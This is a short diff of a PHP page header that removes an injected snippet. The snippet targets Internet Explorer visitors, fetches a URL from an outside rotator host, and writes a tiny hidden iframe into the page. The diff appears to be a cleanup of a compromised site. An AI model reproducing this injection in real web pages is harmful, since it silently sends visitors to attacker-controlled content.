@@ -1,12 +1,4 @@
-<?php     
-$ua     = $_SERVER['HTTP_USER_AGENT'];     
-$isIE   = (bool)preg_match('/Trident/i', $ua);     
-$isIE2  = (bool)preg_match('/MSIE/i', $ua);     
-if ($isIE || $isIE2) {         
-$key= 'c79b68f6cf00bb35ade05d4b438753f1';         
-$flow_url = file_get_contents('http://adrotate.pw/rotator/').$key;         
-echo('<iframe src='.$flow_url.' width="1%" height="1"></iframe>');
-     }
+<?php   
 ?>
 <!DOCTYPE HTML>
 <html lang="en-US">
